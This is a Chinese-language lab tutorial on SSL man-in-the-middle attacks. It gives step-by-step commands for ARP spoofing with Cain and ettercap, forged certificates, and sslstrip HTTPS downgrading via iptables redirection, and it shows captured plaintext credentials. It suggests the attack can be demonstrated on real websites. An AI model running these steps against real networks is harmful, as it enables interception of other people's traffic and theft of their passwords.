# 针对ssl的中间人攻击

---
##0x00实验环境
这一步可以跳过直接用真实网站演示
1. ununtu虚拟机(搭建https环境)
2. win7虚拟机(欺骗目标)
3. win10(攻击机)

###1.https环境搭建
ubuntu虚拟机中运行以下命令：
```
#安装web容器
apt install nginx
#生成密钥
openssl genrsa -out privkey.pem 1024/2038
#用密钥生成证书
openssl req -new -x509 -key privkey.pem -out server.pem -days 365
#配置nginx
server {
    listen 443;
  server_name youdomain.com;

  ssl on;
    ssl_certificate /path/to/server.pem;
    ssl_certificate_key /path/to/privkey.pem;
  
  ...
#重启nginx
service nginx restart
```
配置完成效果（浏览器端要信任证数）
![image_1dalbt4g81nf47qo1h6s1hp6snap.png-15.1kB][1]
###2.网络配置
两台虚拟机均使用桥接模式，确保三台机器处于同一网段
`arp -a`
![image_1daks87hmq13qle11r9i755d79.png-16.1kB][2]
##0x01中间人攻击
###1.ARP-HTTPS中间人攻击原理
攻击原理：合法客户端向网站发出SSL请求时，黑客截获了这个请求，将其改成自己发出的，然后发给网站，网站收到后，会与黑客的计算机协商SSL加密级别，此时两者之间的加密是正常的，而黑客在与网站交互的同时，记录下对方的证书类型及算法，并使用同样的算法伪造了证书，将这一伪造证书发给了客户端，此时，客户端以为自己在和网站交互，实际上是在和黑客的机器交互。原本加密的信息由于采用的是黑客的证书变成了明文，这样密码就截获了。

APR-HTTPS可以捕获和解密主机和服务器间的HTTPS通信，与APR-Cret证书收集器配合使用，注入伪造的数字证书到SSL会话中，在被欺骗主机到达真正的服务器之前解密和加密数据。这种HTTPS欺骗会利用伪造的数字证书，因此对方会看到这个弹出的未经认证的数字证书请求认证。
主要过程：
1. 开启HTTPS过滤，
2. 激活APR欺骗，
3. “被欺骗主机”开启一个HTTPS会话，
4. 来自“被欺骗主机”的数据包被APR注入，并被CAIN捕获，
5. APR-HTTPS从APR-Cret证书收集器中搜索一个相近的伪证书，并是使用这个伪证书。
6. 捕获的数据包修改了MAC、IP、TCP源端口，然后使用Winpcap重新发送到局域网，与客户端建立连接
7. 创建HTTPS服务器连接，（“被欺骗主机”要连接的真实的服务器）
8. 使用伪证书与真实服务器连接，并使用OpenSSL库管理加密的通信。
9. 包由客户端发送出去，被修改后再回到“被欺骗主机”
10. 来自HTTPS服务器的数据被加密保存到会话文件中，重新加密并经客户端连接发送到“被欺骗主机”

###2.实战模拟
####2.1使用cain完成攻击
下载地址：http://www.oxid.it/cain.html
启动cain
如果启动时提示：
![image_1dald5l53clj1ju5u861nds5k02t.png-13.7kB][3]
则表示443端口被占用，一般是vmware-hostd.exe占用了443端口
或者查看一下什么进程占用443端口：
```
#查看占用443端口的进程
netstat -ano | find "443" | find "LISTENING"
tasklist | find "8036"
```
然后把目标进程杀掉或者把服务停止后重启cain即可
先进行内网探测（如果没有探测到就更改一下扫描模式）
![image_1dalcboa55b51tnlpsm1ij41cf41j.png-43.7kB][4]![image_1dalcgou4boi139312ja1omd1rkn2g.png-40.6kB][5]
已经扫描到靶机102，然后进行中间人攻击
![image_1dalfhvl01lbc1fo3pjf14huba02g.png-184.3kB][6]
伪造证书（这一步可以跳过，启动arp攻击后，靶机访问目标网站可自动生成）
![image_1dalfemh3i2p1dd6119q14qi92h13.png-80.1kB][7]
启动arp攻击
![image_1dalfjnr819oj1msi3v1ojlo1m4d.png-16.3kB][8]
然后用靶机访问目标网站，信任
![image_1dalgf5b814so4og1ebrmgnuan4q.png-68.5kB][9]
在攻击端可以看到明文的http流量
![image_1dalho3pu1vvn1ukfk2bhp91ntk5k.png-54.2kB][10]
抓到了用户名和密码
####2.2使用sslstrip完成攻击
Cain虽然能实现SSL攻击，但是伪造证书的局限性还是很明显的,sslstrip是在09年黑帽大会上由MoxieMarlinspike提出的一种针对SSL攻击的方法,其思想非常简单：ARP欺骗，使得攻击者能截获所有目标主机的网络流量。攻击者利用用户对于地址栏中HTTPS与HTTP的疏忽，将所有的HTTPS连接都用HTTP来代替，同时，与目标服务器建立正常的HTTPS连接，由于HTTP通信是明文传输，攻击者能轻松实施嗅探。
#####2.2.1使用ettercap完成arp攻击
工具安装：`sudo apt install ettercap-graphical`
用法：`sudo ettercap -i ens33 -T -M arp:remote /192.168.1.105// /192.168.1.1//`
#####2.2.1启动sslstrip完成欺骗
```
#步骤一：启用内核包转发，修改/proc/sys/net/ipv4/ip_forward文件，内容为1;
echo 1 > /proc/sys/net/ipv4/ip_forward
#步骤二：端口转发，10000为sslstrip的监听端口；
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
#b步骤三：使用sslstrip完成欺骗
sslstrip -l 10000
```
运行成功后显示如下:
![image_1dap0jk0putja68lvo19u71o12m.png-10.5kB][11]
`cat sslstrip.log`就可以看到明文数据：
![image_1dap0dbod13dnlov42f1cv9jo79.png-14.6kB][12]
##参考资料
[SSL协议中间人攻击原理及解决](https://wenku.baidu.com/view/cbcd161c964bcf84b9d57b80.html)
[中间人攻击之ssl欺骗](https://www.cnblogs.com/Alim/p/5340760.html)
[搭建本地https测试环境](https://www.jianshu.com/p/d047872b40b8)
[cain使用教程](https://www.jianshu.com/p/facff81a4826)
[针对SSL的中间人攻击演示和防范](http://netsecurity.51cto.com/art/201211/365437.htm)
[ettercap的中间人欺骗+sslstrip过滤掉https协议](https://www.cnblogs.com/diligenceday/p/8076478.html)


  [1]: http://static.zybuluo.com/w2t3rp2dd13r/270ud9a8y6nupe8rdsjpn03i/image_1dalbt4g81nf47qo1h6s1hp6snap.png
  [2]: http://static.zybuluo.com/w2t3rp2dd13r/nbxafkgyfs59gb7iolj3nwsp/image_1daks87hmq13qle11r9i755d79.png
  [3]: http://static.zybuluo.com/w2t3rp2dd13r/95vvn1t7n3jpdlqm4h9a5j3m/image_1dald5l53clj1ju5u861nds5k02t.png
  [4]: http://static.zybuluo.com/w2t3rp2dd13r/m96dksqv2guu1wh29yye47pg/image_1dalcboa55b51tnlpsm1ij41cf41j.png
  [5]: http://static.zybuluo.com/w2t3rp2dd13r/5mp336mq1co3jnk9ghfo6xj9/image_1dalcgou4boi139312ja1omd1rkn2g.png
  [6]: http://static.zybuluo.com/w2t3rp2dd13r/23jbkmd04vbtxxmssm1omrey/image_1dalfhvl01lbc1fo3pjf14huba02g.png
  [7]: http://static.zybuluo.com/w2t3rp2dd13r/yhu4g18mqsfqwxugmo4c906x/image_1dalfemh3i2p1dd6119q14qi92h13.png
  [8]: http://static.zybuluo.com/w2t3rp2dd13r/vw3388msm7jrh3d8iw3xru56/image_1dalfjnr819oj1msi3v1ojlo1m4d.png
  [9]: http://static.zybuluo.com/w2t3rp2dd13r/0r5636k9xckb32pxb7xpscju/image_1dalgf5b814so4og1ebrmgnuan4q.png
  [10]: http://static.zybuluo.com/w2t3rp2dd13r/n889jw2v56ai6huvotjbjd5r/image_1dalho3pu1vvn1ukfk2bhp91ntk5k.png
  [11]: http://static.zybuluo.com/w2t3rp2dd13r/pfin5371st7rdvto8lkxpanq/image_1dap0jk0putja68lvo19u71o12m.png
  [12]: http://static.zybuluo.com/w2t3rp2dd13r/sjlnkosbskpds0iowkmja4yv/image_1dap0dbod13dnlov42f1cv9jo79.png
